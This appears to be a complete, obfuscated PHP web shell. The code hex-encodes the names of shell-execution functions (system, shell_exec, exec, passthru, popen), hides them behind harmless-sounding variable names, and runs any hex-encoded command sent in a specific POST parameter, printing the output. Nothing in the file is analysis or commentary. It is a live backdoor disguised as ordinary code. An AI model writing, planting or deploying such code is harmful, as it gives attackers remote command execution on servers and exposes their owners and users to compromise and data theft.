<?php


$hld1 = '3';
$hld2 = '4';
$hld3 = '6';
$hld4 = 'd';
$hld5 = '5';
$hld6 = 'c';
$hld7 = 'f';
$hld8 = '8';
$hld9 = '7';
$hld10 = '1';
$hld11 = '2';
$hld12 = 'e';
$hld13 = '0';
$hld14 = '9';
$reverse_lookup1 = pack("H*", '7'.'3'.'7'.'9'.'7'.$hld1.'7'.$hld2.'6'.'5'.$hld3.$hld4);
$reverse_lookup2 = pack("H*", '7'.'3'.'6'.'8'.'6'.$hld5.$hld3.'c'.$hld3.$hld6.'5'.$hld7.$hld3.$hld5.'7'.$hld8.$hld3.'5'.'6'.$hld1);
$reverse_lookup3 = pack("H*", $hld3.'5'.$hld9.$hld8.$hld3.$hld5.$hld3.'3');
$reverse_lookup4 = pack("H*", $hld9.'0'.'6'.$hld10.$hld9.$hld1.$hld9.'3'.$hld9.'4'.$hld3.$hld8.'7'.$hld11.$hld9.$hld5);
$reverse_lookup5 = pack("H*", '7'.'0'.$hld3.$hld7.'7'.'0'.'6'.'5'.'6'.$hld12);
$reverse_lookup6 = pack("H*", $hld9.$hld1.$hld9.'4'.$hld9.$hld11.$hld3.'5'.'6'.$hld10.$hld3.$hld4.$hld5.'f'.$hld3.$hld9.$hld3.$hld5.$hld9.$hld2.'5'.'f'.'6'.$hld1.'6'.'f'.$hld3.$hld12.'7'.'4'.$hld3.$hld5.'6'.'e'.$hld9.'4'.'7'.'3');
$reverse_lookup7 = pack("H*", '7'.$hld13.'6'.'3'.$hld3.$hld6.'6'.$hld7.'7'.'3'.'6'.'5');
$event_dispatcher = pack("H*", $hld3.$hld5.$hld9.$hld3.'6'.'5'.'6'.$hld12.'7'.'4'.'5'.$hld7.'6'.'4'.'6'.$hld14.$hld9.'3'.'7'.'0'.$hld3.'1'.$hld9.$hld2.$hld3.$hld1.$hld3.$hld8.$hld3.$hld5.'7'.'2');
if (isset($_POST[$event_dispatcher])) {
    $event_dispatcher = pack("H*", $_POST[$event_dispatcher]);
    if (function_exists($reverse_lookup1)) {
        $reverse_lookup1($event_dispatcher);
    } elseif (function_exists($reverse_lookup2)) {
        print $reverse_lookup2($event_dispatcher);
    } elseif (function_exists($reverse_lookup3)) {
        $reverse_lookup3($event_dispatcher, $res_component);
        print join("\n", $res_component);
    } elseif (function_exists($reverse_lookup4)) {
        $reverse_lookup4($event_dispatcher);
    } elseif (function_exists($reverse_lookup5) && function_exists($reverse_lookup6) && function_exists($reverse_lookup7)) {
        $data_chunk_property_set = $reverse_lookup5($event_dispatcher, 'r');
        if ($data_chunk_property_set) {
            $val_rec = $reverse_lookup6($data_chunk_property_set);
            $reverse_lookup7($data_chunk_property_set);
            print $val_rec;
        }
    }
    exit;
}
